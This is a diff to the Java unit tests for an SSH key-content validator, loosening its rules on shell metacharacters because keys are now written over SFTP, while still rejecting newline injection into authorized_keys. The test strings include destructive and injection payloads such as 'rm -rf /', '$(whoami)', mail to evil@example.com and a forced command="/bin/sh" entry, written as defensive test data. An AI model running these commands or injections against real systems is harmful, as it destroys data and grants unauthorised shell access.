@@ -275,19 +275,29 @@ class SSHUtilTest {
     }
 
     @Test
-    void isSafeKeyContentRejectsKeyWithInjectedSingleQuoteBreakingEchoQuoting() {
-        // breaks out of the single-quoted echo '...' command built in addPubKey
-        assertFalse(SSHUtil.isSafeKeyContent("ssh-ed25519 AAAA... '; rm -rf / #"));
+    void isSafeKeyContentAcceptsAnApostropheInAKeyComment() {
+        // Ordinary in a comment, and harmless now that authorized_keys is written over SFTP
+        // rather than through echo '...'. Rejecting it dropped the key from the file and told
+        // the user nothing.
+        assertTrue(SSHUtil.isSafeKeyContent("ssh-ed25519 AAAA... alice's laptop"));
     }
 
     @Test
-    void isSafeKeyContentRejectsOtherShellMetacharacters() {
-        assertFalse(SSHUtil.isSafeKeyContent("ssh-ed25519 AAAA... $(whoami)"));
-        assertFalse(SSHUtil.isSafeKeyContent("ssh-ed25519 AAAA... `whoami`"));
-        assertFalse(SSHUtil.isSafeKeyContent("ssh-ed25519 AAAA... test; rm -rf /"));
-        assertFalse(SSHUtil.isSafeKeyContent("ssh-ed25519 AAAA... test | mail evil@example.com"));
-        assertFalse(SSHUtil.isSafeKeyContent("ssh-ed25519 AAAA... test && rm -rf /"));
-        assertFalse(SSHUtil.isSafeKeyContent("ssh-ed25519 AAAA... test\"quoted\""));
+    void isSafeKeyContentRejectsLineBreaksThatWouldAppendASecondEntry() {
+        // The real risk: a key comment that splits the line gets its own authorized_keys
+        // entry, with its own options.
+        assertFalse(SSHUtil.isSafeKeyContent(
+                "ssh-ed25519 AAAA... x\ncommand=\"/bin/sh\" ssh-ed25519 AAAA... attacker"));
+        assertFalse(SSHUtil.isSafeKeyContent("ssh-ed25519 AAAA... x\r\nssh-ed25519 BBBB... attacker"));
+    }
+
+    @Test
+    void isSafeKeyContentAcceptsShellMetacharactersBecauseNoShellSeesThem() {
+        // addPubKey reads and writes authorized_keys over SFTP, so none of these can do
+        // anything. Keeping them out only cost users their access, silently.
+        assertTrue(SSHUtil.isSafeKeyContent("ssh-ed25519 AAAA... $(whoami)"));
+        assertTrue(SSHUtil.isSafeKeyContent("ssh-ed25519 AAAA... test; rm -rf /"));
+        assertTrue(SSHUtil.isSafeKeyContent("ssh-ed25519 AAAA... test\"quoted\""));
     }
 
     @Test
